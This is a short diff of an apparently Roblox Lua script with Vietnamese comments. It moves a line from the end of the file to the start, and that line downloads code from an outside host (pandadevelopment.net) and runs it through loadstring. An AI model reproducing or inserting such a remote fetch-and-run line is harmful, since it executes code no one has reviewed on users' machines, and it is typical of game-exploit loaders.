@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/e9c206fd76482ee2"))()
+
 -- [[ 0. KHỞI TẠO HỆ THỐNG ]]
 if not game:IsLoaded() then game.Loaded:Wait() end
 local LP = game.Players.LocalPlayer
@@ -253,4 +255,3 @@ game:GetService("RunService").Stepped:Connect(function()
     end)
 end)
 
-loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/e9c206fd76482ee2"))()
